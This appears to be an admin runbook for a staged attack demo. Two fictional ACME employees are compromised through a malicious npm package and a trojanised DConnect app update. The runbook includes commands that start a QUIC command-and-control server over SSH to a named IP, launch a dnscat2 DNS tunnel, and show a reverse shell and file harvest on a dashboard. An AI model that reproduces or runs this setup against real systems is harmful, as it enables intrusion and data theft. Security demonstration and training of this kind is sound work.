# ACME Corp — demo provisioning runbook (admin)

Two-victim show: **arjun.das** (software developer, Linux, no admin) and
**jonathan.lim** (CTO/CIO, Windows desktop, DConnect delivery). End users never
provision anything — arjun only runs `npmi` + `npm run build`, jonathan only
opens DConnect.

---

## A. jonathan.lim's Windows desktop (prep BEFORE his snapshot)

### A1. Install the toolchain (once)

| Tool | Why | Get it |
| --- | --- | --- |
| Node.js ≥ 16 LTS | DConnect build (`npm install`) + Electron runtime | nodejs.org LTS, check *Add to PATH* |
| Python 3.11+ | payload tunnel client + QUIC implant (python.exe on PATH) | python.org, **check *Add python.exe to PATH*** |
| Git for Windows | clone DConnect **and** npm's `git+https` dependency fetches | git-scm.com (default options) |

Verify in PowerShell: `node -v`, `python --version`, `git --version`.

### A2. Install DConnect (no Join yet!)

```powershell
cd $env:USERPROFILE
git clone https://github.com/46y9qkpkjc-ui/dconnect.git DConnect
cd DConnect
npm install                       # downloads Electron once (~1-2 min)
npm start                         # smoke-test launch, then CLOSE the app
```

Desktop shortcut for jonathan.lim: target
`C:\Users\jonathan.lim\DConnect\node_modules\electron\dist\electron.exe`,
arguments `.`, start in `C:\Users\jonathan.lim\DConnect`.

> **Do not click “Join” during prep.** The 2.4.0 update must stream on camera.
> App must sit at v2.3.4 until recording.

### A3. Seed CTO assets + optional niceties

From Git Bash:

```bash
cd /c/Users/jonathan.lim/DConnect/..        # any dir with seed-acme.cmd
./seed-acme.cmd cto                          # OT/IoT + source/model files
```

- Optional pre-warm (so the C2 session appears seconds after the update, not
  a minute): `python -m venv %TEMP%\quicvenv && %TEMP%\quicvenv\Scripts\pip install aioquic`
- `corp-ca.pem` is **not** required on this host (payload falls back to
  insecure TLS for the dashboard POST; npm/GitHub use public CAs).
- Hosts-file entries (`hosts.sample`) only matter if you showcase
  `traceroute`/`scan` on jonathan — not needed for the short cut.
- dnscat is auto-skipped on Windows (`dnscat2.exe` not bundled) — harmless.

### A4. Snapshot

Snapshot **after A1–A3**, before any Join. Restore replays the whole act clean.

---

## B. arjun.das's Linux box (after EVERY snapshot restore, before recording)

1. **Seeds** (all four classes — this is the dashboard wow):

   ```bash
   ./seed-acme.sh all
   ```

2. **Dev project + CI/CD pipeline** (the innocent cover activity):

   ```bash
   ./demo-build.sh      # ~/work/ml-serving + local origin with CI hook
   ```

3. **Hygiene**:

   ```bash
   rm -f /tmp/logfwd.lock        # expired anyway, but keeps npmi deterministic
   command -v npmi               # must resolve (/usr/local/bin/npmi)
   ```

4. **Recording order**:

   ```bash
   cd ~/work/ml-serving
   npmi install ai-model-observability   # the malicious package download
   npm run build                          # typecheck + bundle + git push -> CI/CD
   ```

   `npm run build` ends with the real `git push` whose hook prints
   `remote: [ci] stage … BUILD SUCCESS — pipeline #4721`. Then cut to the
   dashboard — the record from his box is already there (recon, env, file
   harvest, asset register with core IP / MNPI / regulated / OT-IoT).

---

## C. Shared pre-roll (dns1, once per recording session)

```bash
ssh -i ~/.ssh/google_compute_engine arunkumarsubbiah@34.146.249.74 \
  ': > ~/dnsproxy/records.jsonl'                      # fresh canvas
ssh -i ~/.ssh/google_compute_engine arunkumarsubbiah@34.146.249.74 \
  "pkill -f 'python-c2 q[u]icsvr3'"                   # bracket pattern (never combined with launch)
ssh -i ~/.ssh/google_compute_engine arunkumarsubbiah@34.146.249.74 \
  '~/quic/start-c2.sh'                                # fresh console: [C2] Implant connected!
```

Optional extra channel wow (arjun’s install also opens a dnscat session):

```bash
ruby dnscat2.rb --dns host=0.0.0.0,port=53,domain=dns.apexadversary.com
```

Dashboard: `https://dns1.apexadversary.com:8443/` (auto-refresh) · `/victims`.

---

## D. Recording (2 acts)

**Act 1 — arjun.das (Linux dev):**

1. restore arjun snapshot → run section B steps 1–3 (or have them baked in)
2. `npmi install ai-model-observability` → install output streams the 6 phases
3. `npm run build` → build log + CI/CD pipeline green
4. keep the dashboard open on the second screen (his record + asset register
   are the wow)

**Act 2 — jonathan.lim (Windows CTO):**

5. log in → open DConnect from the shortcut
6. click **Join** → sleek 2.4.0 update streams → **join screen with the
   Google/Mashable GIF** → **CUT HERE**
7. switch to `https://dns1.apexadversary.com:8443/` — jonathan’s record lands
   within seconds (DConnect spawned the agent itself; channels live only while
   DConnect stays open)
8. showcase “the rest”: dashboard event feed → `/victims` asset register
   (second victim card) → optional: **REVERSE SHELL** on jonathan.lim
   (`whoami`, `dir`, `help`) — the session appears once the QUIC implant
   registers (a few seconds; instant if the venv was pre-warmed)

Keep DConnect open during the whole 8443 showcase — closing it kills his
channels (watchdog) and ends his shell session.
